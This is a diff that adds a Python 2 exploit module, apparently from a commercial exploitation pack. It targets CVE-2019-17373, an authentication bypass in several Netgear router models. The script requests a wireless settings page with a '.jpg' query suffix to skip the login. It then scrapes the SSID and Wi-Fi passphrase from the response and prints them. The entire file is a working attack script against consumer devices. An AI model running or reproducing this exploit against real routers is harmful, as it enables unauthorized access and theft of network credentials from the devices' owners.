@@ -1,0 +1,48 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_netgear_9'
+_vendor_ = 'netgear'
+_model_  = ['MBR1515', 'MBR1516', 'DGN2200', 'DGN2200M', 'DGND3700', 'WNR2000v2', 'WNDR3300', 'WNDR3400', 'WNR3500', 'WNR834Bv2']
+_vuln_   = 'Authentication Bypass Vulnerability'
+_cve_    = 'CVE-2019-17373'
+_ref_    = 'https://github.com/zer0yu/CVE_Request/blob/master/netgear/Netgear_web_interface_exists_authentication_bypass.md'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/WLG_wireless2.htm?x=1.jpg" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if ("Passphrase" in response.text) and ("ssid" in response.text):
+    print '[+] %s vulnerable' % host
+    m = re.search('name="ssid" value="([^"]+)"', response.text)
+    ssid = ''
+    if m is not None:
+        ssid = m.group(1)    
+    m = re.search('name="passphrase" size=20 maxLength=64 value="([^"]+)"', response.text)
+    passphrase = ''
+    if m is not None:
+        passphrase = m.group(1)      
+    print('SSID: %s\nPassphrase: %s\n\n'%(ssid,passphrase))              
+  else:
+    print '[+] %s not vulnerable' % host    
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
